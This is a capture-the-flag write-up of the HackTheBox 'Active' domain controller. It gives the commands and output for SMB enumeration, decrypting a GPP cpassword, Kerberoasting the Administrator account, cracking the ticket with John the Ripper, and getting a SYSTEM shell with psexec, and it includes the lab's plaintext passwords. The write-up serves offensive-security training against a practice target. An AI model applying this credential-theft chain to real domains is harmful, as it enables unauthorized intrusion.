---
title: "Active HackTheBox Write-Up"
categories:
  - Write-Ups
---
[Active](https://app.hackthebox.com/machines/Active) is a Windows machine on HackTheBox centered around common vulnerabilities associated with Active Directory.

Credentials obtained via SMB enumeration lead to a Kerberoasting attack against the DC that exposes the hash of the Administrator user.

![](https://user-images.githubusercontent.com/85040841/155660165-b9cee581-e34b-406a-8368-ca63eb5f6cc1.png)


# Scanning

Threader 3000 will quickly discover open ports on the machine, after which we can run an Nmap scan with default scripts and version detection.

```ruby
Threader 3000 - Multi-threaded Port Scanner
------------------------------------------------------------
Scanning target 10.129.148.0
------------------------------------------------------------
Port 53 is open
Port 139 is open
Port 135 is open
Port 88 is open
Port 389 is open
Port 445 is open
Port 464 is open
Port 593 is open
Port 636 is open
Port 3268 is open
Port 3269 is open
Port 5722 is open
Port 9389 is open
Port 49152 is open
Port 49153 is open
Port 49154 is open
Port 49155 is open
Port 49158 is open
Port 49175 is open
Port 49171 is open
Port 49176 is open
Port 49157 is open
```

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ sudo nmap -Pn -n -sCV -p 53,135,88,139,389,445,464,593,636,3269,3268,5722,9389,47001,49152,49153,49158,49154,49155,49157,49171,49176,49175 10.129.148.0 -T4 -oN nmapSCV
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-02-25 03:38:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49175/tcp open  msrpc         Microsoft Windows RPC
49176/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-02-25T03:39:43
|_  start_date: 2022-02-25T03:27:05
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
|_clock-skew: -1s
```

We’re dealing with a Windows 2008 R2 Active Directory Domain Controller.

I’ll promptly add its domain name, `active.htb`, to my `/etc/hosts` file and proceed to my enumeration process.

![hosts](https://user-images.githubusercontent.com/85040841/155660225-4aa600c5-5ead-4e65-8d7d-dcd627d931ac.gif)


# Enumeration

Given that this is a Windows machine, let’s start with SMB, which resides on port 445.

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ smbmap -H 10.129.148.0
[+] IP: 10.129.148.0:445        Name: active.htb
	Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        C$                      NO ACCESS       Default share
        IPC$                    NO ACCESS       Remote IPC
        NETLOGON                NO ACCESS       Logon server share
        Replication             READ ONLY
        SYSVOL                  NO ACCESS       Logon server share
        Users                   NO ACCESS
```

SMBMap revealed that we have read access to a non-default share called Replication.

Let’s establish a null session with smbclient and see what we can find.

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ smbclient //10.129.148.0/Replication -U '' -N
Try "help" to get a list of possible commands.
smb: \>
```

After some manual enumeration, I noticed an interesting file named “Groups.xml”, which I downloaded to my machine.

```ruby
smb: \active.htb\Policies\{31...F9}\MACHINE\Preferences\Groups\> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018
smb: \active.htb\Policies\{31...F9}\MACHINE\Preferences\Groups\> get Groups.xml
```

# Exploitation

The contents of this file contained “userName” and “cpassword” fields.

userName: **active.htb\SVC_TGS**

cpassword: **edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ**

![Untitled 1](https://user-images.githubusercontent.com/85040841/155660255-af62a3e3-ffa6-40c8-b986-6c29ecd0d8f9.png)

Looks like we have a set of GPP credentials. 

When a new Group Policy Preference (GPP) is created, there’s an XML file created in the SYSVOL share on a domain controller with config data that includes a username and password associated with the GPP.

For security, the password is AES-encrypted before it’s stored as `cpassword`.

However, because Microsoft publicized the AES key, we can easily decrypt the password using a tool called `gpp-decrypt`.

This type of attack corresponds to technique [T1552.006](https://attack.mitre.org/techniques/T1552/006/) in the MITRE ATT&CK framework. 

![Untitled 2](https://user-images.githubusercontent.com/85040841/155660284-a589c815-1928-4b92-8ffa-c5e3fe7d5f77.png)

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

And just like that, we have a plaintext password.

With our newfound username/password combo, we can enumerate SMB once again and see what shares we now have access to.

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ smbmap -H 10.129.148.0 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
[+] IP: 10.129.148.0:445        Name: active.htb
        Disk                    Permissions     Comment
        ----                    -----------     -------
        ADMIN$                  NO ACCESS       Remote Admin
        C$                      NO ACCESS       Default share
        IPC$                    NO ACCESS       Remote IPC
        NETLOGON                READ ONLY       Logon server share 
        Replication             READ ONLY
        SYSVOL                  READ ONLY       Logon server share 
        Users                   READ ONLY
```

I’ll use smbclient once again to connect to the “Users” share.

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ smbclient //10.129.148.0/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018
```

Looks like it corresponds directly to the `C:\Users` directory.

# User Flag

By navigating to `C:\Users\SVC_TGS\Desktop`, we can immediately retrieve the flag within `user.txt`.

![Untitled 3](https://user-images.githubusercontent.com/85040841/155660300-b00aac8d-c5c1-4c56-a32c-0703cdf99e88.png)

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ cat user.txt  
2639************************342f
```

# Kerberoasting

Kerberoasting is a technique in which an attacker obtains an encrypted TGS ticket encrypted with a service account's NTLM hash.

AD account lockouts are avoided by extracting the hash and cracking it offline.

![image](https://user-images.githubusercontent.com/85040841/156118064-a864379d-af3e-4ef2-891f-d6aeb4f066d2.png)

I’ll use `GetUserSPNs.py` from the Impacket library to obtain a list of service usernames that are associated with standard user accounts and a ticket.

![Untitled 4](https://user-images.githubusercontent.com/85040841/155660318-3487cf12-2b67-49a5-98cf-31d1fa009f75.png)

Inside of `outputGUSPNS` is a hash that I can crack with either Hashcat or John the Ripper.

We got the Administrator user's hash!

![Untitled 5](https://user-images.githubusercontent.com/85040841/155660327-82844210-adcf-4d50-bd4c-4cf3d27880bf.png)

Let’s use John the Ripper and the rockyou.txt wordlist to perform a dictionary attack against it.

```ruby
┌──(kali㉿kali)-[~/htb/machines/active]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs outputGUSPNS 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:04 DONE (2022-02-25 00:03) 0.2336g/s 2462Kp/s 2462Kc/s 2462KC/s Tiffani1432..Thomas31121979
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now that we have the password for the Administrator user, we can easily use `psexec.py`, another Impacket script, to spawn a shell as NT AUTHORITY\SYSTEM.

![psexec](https://user-images.githubusercontent.com/85040841/155660339-7f1ad6f2-6e34-46bf-8df2-e45cda7bf3c5.gif)

# Root Flag

```ruby
C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> type root.txt
09f2************************f97d
```
